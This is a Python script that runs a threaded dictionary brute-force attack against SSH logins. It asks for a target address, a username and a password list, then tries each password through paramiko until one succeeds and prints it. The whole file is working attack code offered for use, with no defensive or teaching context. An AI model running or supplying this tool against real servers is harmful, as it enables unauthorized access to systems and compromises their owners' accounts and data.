import paramiko, sys, os, termcolor, threading, time

stop_flag = 0

def ssh_connect(password):
    global stop_flag, host, username
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=password)
        stop_flag=1
        print(termcolor.colored(('[+] Found Password '+ password + ' For Username ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorect Login: '+ password), 'red'))
    ssh.close()


print('-------------------------------------------------')
host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Password File/Path: ')
print('-------------------------------------------------')


if not os.path.exists(input_file): sys.exit(1)

print(termcolor.colored(('|| Starting bruteforce attack on '+ host + ' at port '+ str(22)+ ' for usrname '+ username + ' ||'), 'yellow'))

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag==1:
            t.join()
            exit()

        passwd = line.strip()
        t = threading.Thread(target=ssh_connect, args=(passwd,))
        t.start()
        time.sleep(0.5)


